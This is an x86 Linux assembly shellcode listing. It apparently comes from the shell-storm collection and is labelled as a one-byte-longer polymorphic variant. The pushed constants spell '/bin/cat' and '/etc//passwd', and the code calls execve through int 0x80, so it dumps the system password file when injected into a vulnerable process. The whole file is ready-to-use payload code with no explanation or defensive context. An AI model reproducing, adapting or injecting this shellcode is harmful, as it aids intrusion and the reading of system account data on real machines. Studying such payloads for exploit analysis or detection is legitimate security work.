; Website:  http://shell-storm.org/shellcode/files/shellcode-571.php
; original: 43
; poly: 44

global _start

section .text
_start:
  xor eax,eax
  cdq

  push edx
  push 0x7461632f
  push 0x6e69622f
  mov ebx,esp

  push edx

  push 0x64777373
  push 0x61702f2f
  push 0x6374652f
  mov ecx,esp

  mov al,0xb
  push edx
  push ecx
  push ebx
  mov ecx,esp
  int 0x80
